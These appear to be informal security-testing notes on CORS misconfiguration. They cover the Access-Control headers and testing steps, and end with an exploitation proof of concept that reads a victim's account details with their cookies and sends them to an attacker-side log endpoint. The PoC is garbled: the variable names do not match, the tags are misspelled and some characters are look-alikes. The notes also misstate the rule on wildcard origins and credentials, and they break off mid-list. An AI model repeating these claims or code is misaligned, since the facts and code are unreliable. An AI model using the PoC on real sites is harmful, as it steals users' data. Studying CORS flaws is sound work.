## cors

It instructs the browser which resource to access from other websites
These headers start with ```Access Control``` for example, 

Basically adds flexibility to the same origin policy.

```
HTTP/1.1 200 OK
Cache-Control: no-cache
Access-Control-Allow-Origin: https://a.com
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers:
cache-control, content-language, expires, last-modified, content-range, content-length, accept-ranges
Cache-Control: no-cache
Content-Туре: application/json
Vary: Accept-Encoding
Connection: close
Content-Length: 15
{"status": "ok"}

```

- Access-Control-Allow-Origin : describes which origin can access the response, if the header is set to **wildcard** then the it can access resources from any origin
- Access-Control-Allow-Credentials : indicates if request can contain credentials,if this is set to true any request sent will include the cookies and by default this header is set to false.
- Access-Control-Expose-Headers : allowing certain headers.


If origin header is said to wildcard then credentials cannot be false for security reasons


Blackbox Testing of this misconfiguration:

* Map the application 
* Test the application for dynamic generation
    - Does it refelct ACAO headers or not.(changing the values of the headers of the website)
    - some use regex to validate the string.
    - Does it allow null origin
    - Does it restrict the protocol
    - Does it allow passing the credentials
* once cors is found determine the impact of it.

White box

* Determine the frameworks used.
* find out if that stack allows for cors configuration 
* review code to identify any misconfiguration in cors rules


Exploitation 

* If the application allows for credentials.
    - This it the poc used
``` <html> ‹body›
        <h1›Hello World!‹/h1>
        <scripts>
        var hr = new XMLHttpRequest () ;
        var url = "<https://vulnerable-site.com>"
        xhr.onreadystatechange = function() {
             if (xhr.readyState == XMLHttpRequest.DONE) {
            fetch("/log?key=" + xhr.responseText)
            }
        }
        xhr.open ('GET', url + "/accountDetails", true);
        xhr.withCredentials = true;
        xhr.send (null);
        ‹/script> </bodv>

     </html>
```

* if the application does not allow for credentials.
    -